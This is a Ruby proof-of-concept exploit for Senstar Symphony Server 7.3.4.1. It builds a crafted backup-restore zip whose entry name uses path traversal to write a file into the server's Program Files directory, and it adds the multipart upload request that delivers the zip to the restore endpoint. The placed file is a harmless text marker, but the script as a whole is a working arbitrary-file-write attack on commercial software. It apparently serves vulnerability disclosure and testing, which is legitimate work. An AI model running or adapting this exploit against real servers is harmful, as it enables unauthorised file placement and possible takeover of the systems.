#!/usr/bin/env ruby
# senstar symphony server 7.3.4.1 (Symphony Server 7.3.4.1 Installer).
# (authenticated users) can place arbitrary files into arbitrary locations 
# with a specially crafted restore configuration archive. 
# /ServerConfig#settings/backup

require 'rex'
require 'rex/zip'

zip = Rex::Zip::Archive.new
zip.add_file("\\..\\..\\Program Files (x86)\\Senstar\\Symphony Server v7\\lalo.txt", "lalo")
zip.save_to("senstar_poc.zip")
__END__
-----------------------------698009891551050386800724958
Content-Disposition: form-data; name="backupFile"; filename="senstar_poc.zip"
Content-Type: application/zip

<data>
-----------------------------698009891551050386800724958
Content-Disposition: form-data; name="ignoreXNetData"

false
-----------------------------698009891551050386800724958
Content-Disposition: form-data; name="ignoreServers"

false
-----------------------------698009891551050386800724958--
